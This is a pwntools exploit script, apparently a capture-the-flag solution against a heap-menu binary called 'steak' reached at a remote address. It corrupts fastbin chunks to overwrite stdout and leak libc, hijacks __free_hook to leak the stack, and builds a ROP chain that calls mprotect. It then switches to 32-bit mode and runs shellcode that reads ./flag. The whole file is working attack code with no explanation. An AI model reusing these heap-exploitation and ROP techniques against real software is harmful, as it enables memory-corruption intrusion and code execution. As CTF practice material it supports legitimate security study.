from pwn import *
#context.log_level='debug'
def cmd(c):
	p.sendlineafter(">\n",str(c))
def add(size,data="\n"):
	cmd(1)
	p.sendlineafter("size:\n",str(size))
	p.sendafter("buf:\n",data)
def free(idx):
	cmd(2)
	p.sendlineafter("index:\n",str(idx))
def edit(idx,buf,size=0x100):
	cmd(3)
	p.sendlineafter("index:\n",str(idx))
	p.sendlineafter("size:\n",str(size))
	p.sendafter("buf:\n",buf)
def C(c):
	p.sendlineafter(">",str(c))
def A(size,data="\n"):
	C(1)
	p.sendlineafter("size:",str(size))
	p.sendafter("buf:",data)
def F(idx):
	C(2)
	p.sendlineafter("index:",str(idx))
def E(idx,buf,size=0x100):
	C(3)
	p.sendlineafter("index:",str(idx))
	p.sendlineafter("size:",str(size))
	p.sendafter("buf:",buf)
def cp(a,b,lenth=8):
	C(4)
	p.readuntil("index:")
	p.sendline(str(a))
	p.readuntil("index:")
	p.sendline(str(b))
	p.sendlineafter("length:",str(lenth))
def lea():
	C()
def sss(rax,rdi,rsi,rdx):
	return p64(pop_rax+libc.address) + p64(rax) + p64(ps)+p64(rsi)+p64(0)+p64(pd)+p64(rdi) + p64(pop_rdx+libc.address) + p64(rdx) + p64(syscall+libc.address)
#p=process("./steak",env = {"LD_PRELOAD": "./libc-2.23.so"})

#p=process("./steak")
p=remote("10.21.13.69",60001)
#p=process("./steak")
binary=ELF("./steak")
libc=binary.libc
add(0x68,'\n')#0
add(0x68,'\n')#1
add(0x68,'\n')#2
add(0x90,'\n')#3
add(0x90,'\n')#4
free(0)
free(1)
free(3)
edit(2,"A"*0x68+p64(0x71)+"\xdd\x25")
edit(0,"A"*0x68+p64(0x71)+'\x50\x31')
add(0x68)#5
add(0x68)#6

add(0x68,"\x00"*3+p64(0)*6+p64(0xfbad1800)+p64(0)*3+"\x00")#7
p.read(0x40)
base=u64(p.read(8))-(0x7ffff7dd2600-0x00007ffff7a0d000)
libc.address=base
log.warning(hex(base))
A(0x68)#8

A(0x68)#9
A(0x68)#10
A(0x68)#11
F(9)
F(10)
E(10,p64(0x6021A0-19))
A(0x68)#11
A(0x68,"\x00"*3+p64(libc.symbols['__free_hook'])+p64(libc.symbols['__malloc_hook'])+p64(libc.symbols['environ'])+p64(0x6021A0))#12
E(0,p64(libc.symbols['puts']))
F(2)
p.readline()
stack=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7fffffffdf78-0x00007ffffffde000)
log.warning(hex(stack))
ret_addr=0xdeadbeef

E(3,p64(libc.symbols['__free_hook'])+p64(libc.symbols['__malloc_hook'])+p64(0x7fffffffde88-0x00007ffffffde000+stack-8)+"/bin/sh\x00" + p64(0x602240) + p64(0x602800))
pd=0x0000000000400ca3
ps=0x0000000000400ca1#pop rsi; pop r15; ret;
pop_rdx = 0x0000000000001b92#pop rdx;ret;
syscall = 0x00000000000bc375#syscall; ret;
pop_rax = 0x0000000000033544#pop_rax; ret;
pop_r10 = 0x00000000001150a5#pop r10;ret
leave = 0x00000000004008d7#leave;ret
retfq = 0x0000000000107428
ski=0x0000000000400291
rop =p64(0x602800-8)+ sss(0xa,0x602000,0x1000,0x7)+p64(leave)

shellcode=asm(shellcraft.open("./flag"))
leak='''
mov ebx, eax
mov eax,3
mov ecx,0x602900
mov edx,0x72
int 0x80
mov eax,0x4
mov ebx,0x1
mov ecx,0x602900
mov edx,0x30
int 0x80
'''
shellcode+=asm(leak)

shellcode_addr=0x602240
#gdb.attach(p,'b *0x000000000400C3A')
E(5,p64(retfq+libc.address) + p64(shellcode_addr) + p64(0x23))# switch the mode from 64bit to 32bit 
E(4,shellcode)
E(2,rop)
p.sendline("6")
p.interactive()

